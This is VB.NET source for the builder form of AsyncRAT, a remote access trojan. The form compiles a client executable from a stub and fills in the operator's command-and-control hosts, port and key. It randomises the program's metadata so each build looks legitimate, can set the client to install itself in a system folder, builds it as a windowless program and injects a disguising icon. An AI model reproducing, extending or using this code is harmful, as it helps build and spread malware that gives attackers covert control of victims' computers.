
Public Class Builder

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim Stub = My.Resources.Stub

        Try
            Dim o As New SaveFileDialog With {
            .Filter = ".exe (*.exe)|*.exe",
            .InitialDirectory = Application.StartupPath,
            .Title = "AsyncRAT Builder",
            .OverwritePrompt = False,
            .FileName = "AsyncRAT-Client"
            }
            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                Stub = Replace(Stub, "#Const Release = False", "#Const Release = True")

                Stub = Replace(Stub, "%HOSTS%", TextBox1.Text.Trim().Replace(",", ChrW(34) + "," + ChrW(34)))
                Stub = Replace(Stub, "%PORT%", TextBox2.Text)
                Stub = Replace(Stub, "%KEY%", Settings.KEY)

                Stub = Replace(Stub, "%Title%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Description%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Company%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Product%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Copyright%", Randomi(rand.Next(3, 6)) + " © " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Trademark%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%v1%", rand.Next(0, 10))
                Stub = Replace(Stub, "%v2%", rand.Next(0, 10))
                Stub = Replace(Stub, "%v3%", rand.Next(0, 10))
                Stub = Replace(Stub, "%v4%", rand.Next(0, 10))
                Stub = Replace(Stub, "%Guid%", Guid.NewGuid.ToString)


                If CheckBox1.Checked Then
                    If Not TextBox3.Text.EndsWith(".exe") Then
                        TextBox3.Text = TextBox3.Text + ".exe"
                    End If
                    Stub = Replace(Stub, "%EXE%", TextBox3.Text)
                    Stub = Replace(Stub, "%DIR%", ComboBox1.Text)
                    Stub = Replace(Stub, "#Const INS = False", "#Const INS = True")
                End If

                Dim providerOptions = New Dictionary(Of String, String)
                providerOptions.Add("CompilerVersion", "v4.0")
                Dim CodeProvider As New VBCodeProvider(providerOptions)
                Dim Parameters As New CodeDom.Compiler.CompilerParameters
                Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
                With Parameters
                    .GenerateExecutable = True
                    .OutputAssembly = o.FileName
                    .CompilerOptions = OP
                    .IncludeDebugInformation = False
                    .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                    .ReferencedAssemblies.Add("System.dll")
                    .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                    .ReferencedAssemblies.Add("System.Management.dll")
                    .ReferencedAssemblies.Add("System.Drawing.dll")


                    Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Stub)
                    For Each uii As CodeDom.Compiler.CompilerError In Results.Errors
                        MsgBox(uii.ToString)
                        Exit Sub
                    Next

                    If PictureBox1.ImageLocation <> Nothing Then
                        IconChanger.InjectIcon(o.FileName, PictureBox1.ImageLocation)
                    End If
                    STV("HOST", TextBox1.Text)
                    MessageBox.Show(o.FileName, "Done!", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
                    Me.Close()
                End With
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If GTV("HOST") <> Nothing Then
            TextBox1.Text = GTV("HOST")
        Else
            TextBox1.Text = "127.0.0.1,Dns.com"
        End If
        TextBox2.Text = String.Join(",", Settings.Ports.ToList)
        For Each typeSpecialFolder In Environment.SpecialFolder.GetValues(GetType(Environment.SpecialFolder))
            ComboBox1.Items.Add(typeSpecialFolder)
            If typeSpecialFolder.ToString = "ApplicationData" Then
                ComboBox1.Text = "ApplicationData"
            End If
        Next
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "*.ico (*.ico)| *.ico"
                .InitialDirectory = Application.StartupPath + "\Misc\Icons"
                .Title = "Select Icon"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBox1.ImageLocation = o.FileName
            Else
                PictureBox1.ImageLocation = Nothing
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            TextBox3.Enabled = True
            ComboBox1.Enabled = True
        Else
            TextBox3.Enabled = False
            ComboBox1.Enabled = False
        End If
    End Sub
End Class